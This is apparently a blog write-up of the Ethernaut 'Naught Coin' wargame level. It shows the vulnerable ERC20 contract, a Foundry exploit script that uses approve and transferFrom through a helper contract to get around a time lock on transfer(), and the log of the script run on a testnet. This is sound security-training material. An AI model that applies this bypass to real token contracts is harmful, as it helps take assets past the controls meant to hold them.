---
layout: post
title: "[Ethernaut] 15.Naught Coin"
tags: blockchain ethernaut foundry ERC20
---

# Analysis

---

The goal is

1. getting your token balance to 0

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

`timeLock` is set to 10 years after the block was created

This code should be read:
[openzeppelin-contracts-08/token/ERC20/ERC20.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ecd2ca2cd7cac116f7a37d0e474bbb3d7d5e1c4d/contracts/token/ERC20/ERC20.sol)

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol";

contract Ex {
    function ex(NaughtCoin nc_, address _player, uint256 _token) external{
        nc_.transferFrom(_player, address(this), _token);
    }
}

contract NaughtCoinSol is Script {
    NaughtCoin public nc_ = NaughtCoin(0x6bF577FBb92fcE9F1480EbBeD1aC0403b21025b2);
    uint256 public token = nc_.INITIAL_SUPPLY();

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Balances: ", nc_.balanceOf(vm.envAddress("MY_ADDRESS")));
        Ex ex = new Ex();
        nc_.approve(address(ex), token);
        ex.ex(nc_, vm.envAddress("MY_ADDRESS"), token);
        console.log("Balances: ", nc_.balanceOf(vm.envAddress("MY_ADDRESS")));
        

        vm.stopBroadcast();
    }
}
```
The `transferFrom` function can retrieve tokens up to the approved amount if approval was previously granted through the `approve` function.

After creating the `Ex` contract and granting approval, tokens can be retrieved from the `Ex` contract using the `transferFrom` function without the `timeLock` restriction.

```bash
$ forge script script/NaughtCoinSol.sol:NaughtCoinSol --broadcast
[⠒] Compiling...
No files changed, compilation skipped
Script ran successfully.

== Logs ==
  Balances:  1000000000000000000000000
  Balances:  0

## Setting up 1 EVM.

==========================

Chain 17000

Estimated gas price: 0.001008466 gwei

Estimated total gas used for script: 410540

Estimated amount required: 0.00000041401563164 ETH

==========================
⠂ Sequence #1 on holesky | Waiting for pending transactions
    ⠠ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3
    ⡀ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749
⢀ Sequence #1 on holesky | Waiting for pending transactions
    ⡀ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3
    ⠄ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749
⠁ Sequence #1 on holesky | Waiting for pending transactions
    ⠂ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3
    ⠐ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749
⠁ Sequence #1 on holesky | Waiting for pending transactions
    ⠁ [Pending] 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3
    ⠠ [Pending] 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749

##### holesky
✅  [Success] Hash: 0x23273456be3c27b0f80645e636e8e4eacdc611b21b600af10fe0b91980c485f3
Contract Address: 0x5027B78a821BB27bd371F0699bC6CDC12778C34e
Block: 3767317
Paid: 0.000000210921904108 ETH (209156 gas * 0.001008443 gwei)

##### holesky
✅  [Success] Hash: 0x393caf180b8749d4deac62bc9e0c2905ec4ee8cf3f243272f2c115cccf935125
Block: 3767317
Paid: 0.000000054534580554 ETH (54078 gas * 0.001008443 gwei)

##### holesky
✅  [Success] Hash: 0x7a4a624dabc1898581d4321f5be8c6e971cddb659cac3cd838966733cddfc749
Block: 3767317
Paid: 0.000000046685868685 ETH (46295 gas * 0.001008443 gwei)

✅ Sequence #1 on holesky | Total Paid: 0.000000312142353347 ETH (309529 gas * avg 0.001008443 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```